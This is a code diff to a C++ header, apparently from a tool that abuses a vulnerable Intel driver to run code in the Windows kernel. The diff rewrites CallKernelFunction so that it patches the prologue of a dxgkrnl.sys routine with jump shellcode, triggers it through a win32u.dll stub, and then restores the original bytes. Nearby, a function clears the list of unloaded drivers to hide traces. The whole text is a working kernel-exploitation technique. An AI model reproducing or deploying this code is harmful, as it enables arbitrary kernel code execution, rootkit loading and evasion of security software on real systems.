@@ -79,66 +79,90 @@ namespace intel_driver
 	bool ClearMmUnloadedDrivers(HANDLE device_handle);
 
 	template<typename T, typename ...A>
-	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments)
+	bool CallKernelFunction( HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments )
 	{
-		constexpr auto call_void = std::is_same_v<T, void>;
-
-		if constexpr (!call_void)
+		UNREFERENCED_PARAMETER( out_result );
+ 
+		if ( !kernel_function_address )
+			return false;
+ 
+		// load user mode api
+ 
+		HMODULE hWin32u = LoadLibrary( "win32u.dll" );
+ 
+		if ( !hWin32u )
+			return false;
+ 
+		FARPROC win32u_routine
+			= GetProcAddress( hWin32u, "NtTokenManagerConfirmOutstandingAnalogToken" );
+ 
+		if ( !win32u_routine )
+			return false;
+ 
+		// page in
+ 
+		using tFunction = UINT_PTR ( __stdcall* )( void* a1/*, void* a2, void* a3*/ );
+		auto FnWin32u = reinterpret_cast<tFunction>( win32u_routine );
+ 
+		FnWin32u( nullptr/*, nullptr, nullptr */ );
+ 
+		// write shell
+ 
+		const uint64_t dxgk_routine
+			= GetKernelModuleExport( device_handle, utils::GetKernelModuleAddress( "dxgkrnl.sys" ), "NtTokenManagerConfirmOutstandingAnalogToken" );
+		
+		if ( !dxgk_routine )
 		{
-			if (!out_result)
+			printf( "[!] dxgk_routine not found, module: %llx\n", utils::GetKernelModuleAddress( "dxgkrnl.sys" ) );
+			return false;
+		}
+ 
+		uint8_t dxgk_original[] = { 0x48, 0x89, 0x5C, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0xFF, 0x15, 0x70, 0x00, 0x00 };
+		
+		if ( !ReadMemory( device_handle, dxgk_routine, &dxgk_original, sizeof( dxgk_original ) ) )
+		{
+			printf( "[!] failed to create a copy of the function prolouge\n" );
+			return false;
+		}
+ 
+		uint8_t shell_code_start[]
+		{
+			0x48, 0xB8 // mov rax, [xxx]
+		};
+ 
+		uint8_t shell_code_end[]
+		{
+			0xFF, 0xE0, // jmp rax
+			0xCC //
+		};
+ 
+		WriteToReadOnlyMemory( device_handle, dxgk_routine, &shell_code_start, sizeof( shell_code_start ) );
+		WriteToReadOnlyMemory( device_handle, dxgk_routine + sizeof( shell_code_start ), &kernel_function_address, sizeof( void* ) );
+		WriteToReadOnlyMemory( device_handle, dxgk_routine + sizeof( shell_code_start ) + sizeof( void* ), &shell_code_end, sizeof( shell_code_end ) );
+ 
+		// restore
+ 
+		constexpr auto call_void = std::is_same_v<T, void>;
+ 
+		if constexpr ( !call_void )
+		{
+			if ( !out_result )
 				return false;
 		}
-		else
+ 
+		if constexpr ( !call_void )
 		{
-			UNREFERENCED_PARAMETER(out_result);
+			using FunctionFn = T ( __stdcall* )( A... );
+			const auto Function = reinterpret_cast<FunctionFn>( win32u_routine );
+			*out_result = Function( arguments ... );
+		} else {
+			using FunctionFn = void ( __stdcall* )( A... );
+			const auto Function = reinterpret_cast<FunctionFn>( win32u_routine );
+			Function( arguments... );
 		}
-
-		if (!kernel_function_address)
-			return false;
-
-		// Setup function call 
-
-		const auto NtGdiDdDDIReclaimAllocations2 = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("gdi32full.dll"), "NtGdiDdDDIReclaimAllocations2"));
-
-		if (!NtGdiDdDDIReclaimAllocations2)
-		{
-			std::cout << "[-] Failed to get export gdi32full.NtGdiDdDDIReclaimAllocations2" << std::endl;
-			return false;
-		}
-
-		// Get function pointer (@win32kbase!gDxgkInterface table) used by NtGdiDdDDIReclaimAllocations2 and save the original address (dxgkrnl!DxgkReclaimAllocations2)
-
-		uint64_t kernel_function_ptr = 0;
-		uint64_t kernel_original_function_address = 0;
-
-		if (!GetNtGdiDdDDIReclaimAllocations2KernelInfo(device_handle, &kernel_function_ptr, &kernel_original_function_address))
-			return false;
-
-		// Overwrite the pointer with kernel_function_address
-
-		if (!WriteToReadOnlyMemory(device_handle, kernel_function_ptr, &kernel_function_address, sizeof(kernel_function_address)))
-			return false;
-
-		// Call function 
-
-		if constexpr (!call_void)
-		{
-			using FunctionFn = T(__stdcall*)(A...);
-			const auto Function = static_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2);
-
-			*out_result = Function(arguments...);
-		}
-		else
-		{
-			using FunctionFn = void(__stdcall*)(A...);
-			const auto Function = static_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2);
-
-			Function(arguments...);
-		}
-
-		// Restore the pointer
-
-		WriteToReadOnlyMemory(device_handle, kernel_function_ptr, &kernel_original_function_address, sizeof(kernel_original_function_address));
+ 
+		// restore
+		WriteToReadOnlyMemory( device_handle, dxgk_routine, &dxgk_original, sizeof( dxgk_original ) );
 		return true;
 	}
 }
